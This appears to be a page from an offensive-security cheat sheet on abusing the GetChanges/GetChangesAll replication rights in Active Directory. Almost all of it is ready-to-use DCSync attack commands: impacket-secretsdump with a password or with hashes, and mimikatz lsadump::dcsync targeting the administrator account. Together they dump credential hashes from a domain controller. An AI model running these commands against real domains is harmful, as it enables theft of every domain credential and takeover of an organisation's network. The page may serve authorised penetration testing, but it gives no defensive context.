---
title: "GetChanges/GetChangesAll"
date: 2024-7-9
tags: ["GetChanges", "GetChangesAll", "dcsync", "secretsdump", "active driectory", "ad", "Windows"]
---

---
#### Abuse #1: DCSync Attack

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```bash
# With creds
impacket-secretsdump -just-dc <USER>:<PASSWORD>@<TARGET>
```

```bash
# With hashes
impacket-secretsdump -hashes <LM>:<NT> -just-dc <DOMAIN>/<USER>@<TARGET>
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

<div>

```powershell
.\mimikatz.exe 'lsadump::dcsync /domain:<DOMAIN> /user:administrator' exit
```

</div>

{{< /tabcontent >}}

<br>